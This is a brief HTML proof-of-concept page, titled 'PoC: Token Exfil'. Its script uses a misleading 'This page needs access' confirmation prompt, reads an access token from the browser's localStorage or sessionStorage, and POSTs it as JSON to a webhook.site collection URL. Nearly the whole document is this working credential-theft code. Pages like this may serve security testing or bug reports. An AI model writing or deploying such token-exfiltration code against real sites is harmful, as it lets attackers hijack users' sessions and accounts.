<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Token Exfil</title>
</head>
<body>
  <script>
    // 1. Show confirmation popup
    if (confirm("This page needs access. Click OK to continue.")) {
      // 2. Try to extract access token
      const token = localStorage.getItem('accessToken') || sessionStorage.getItem('accessToken');
      
      if (token) {
        // 3. Send token to webhook
        fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token })
        });
      } else {
        alert("‚ùå Token not found in storage.");
      }
    }
  </script>
</body>
</html>
